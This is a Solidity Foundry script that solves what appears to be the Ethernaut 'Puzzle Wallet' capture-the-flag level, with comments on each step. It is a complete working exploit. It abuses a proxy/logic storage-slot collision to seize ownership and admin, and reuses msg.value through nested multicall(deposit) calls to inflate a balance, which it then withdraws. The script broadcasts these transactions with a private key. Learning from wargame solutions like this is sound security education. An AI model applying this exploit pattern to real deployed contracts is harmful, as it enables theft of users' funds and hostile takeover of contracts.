// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/PuzzleWallet.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * Storage Layout Overview (shared between proxy and logic contracts via delegatecall):
 *
 *                 slot 0              slot 1
 * ------------------------------------------------
 * PuzzleProxy     pendingAdmin        admin
 * PuzzleWallet    owner               maxBalance
 *
 * Due to delegatecall, both contracts share the same storage slots,
 * allowing overwrites when functions are called via the proxy.
 */
contract PuzzleWalletScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x2f3dB9d117Aa683dCF8fFfDC7C09849EcEd8d1C6;
    PuzzleWallet public puzzleWallet = PuzzleWallet(ETHERNAUT_CONTRACT_ADDRESS);
    PuzzleProxy public puzzleProxy;

    address PLAYER = address(uint160(uint256(vm.envUint("MY_ADDRESS"))));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. get the PuzzleProxy instance
        puzzleProxy = PuzzleProxy(payable(address(puzzleWallet)));

        // 2 — Overwrite PuzzleWallet.owner (slot 0) by calling PuzzleProxy.proposeNewAdmin()
        // Since proposeNewAdmin stores the value in slot 0, it affects `owner` in PuzzleWallet via delegatecall
        puzzleProxy.proposeNewAdmin(PLAYER);

        // 3 — Whitelist PLAYER by calling addToWhitelist() via delegatecall (msg.sender must be owner)
        puzzleWallet.addToWhitelist(PLAYER);

        // 4 — Trick the contract into thinking more ETH was deposited than actually sent
        // - Wrap deposit() in multicall() twice to reuse msg.value
        // - Due to multicall, each inner call sees the full original msg.value
        // ===> send 0.001 ether => "deposit" 0.002 ether
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        // Nest multicall(deposit) twice to bypass the single-deposit guard
        bytes memory inner1 = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositCall);
        bytes memory inner2 = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositCall);
        bytes[] memory outer = new bytes[](2);
        outer[0] = inner1;
        outer[1] = inner2;

        // Execute the nested multicall with 0.001 ether
        puzzleWallet.multicall{value: 0.001 ether}(outer);

        // 5 — Withdraw the inflated balance
        uint256 playerBal = puzzleWallet.balances(PLAYER);
        puzzleWallet.execute(PLAYER, playerBal, hex"");

        // 6 — Become admin by overwriting PuzzleProxy.admin (slot 1)
        // setMaxBalance writes to slot 1; since it's called via delegatecall, it affects proxy's admin
        puzzleWallet.setMaxBalance(uint256(uint160(PLAYER)));

        // Check
        console.log("puzzleProxy.admin() == PLAYER", puzzleProxy.admin() == PLAYER);

        vm.stopBroadcast();
    }
}
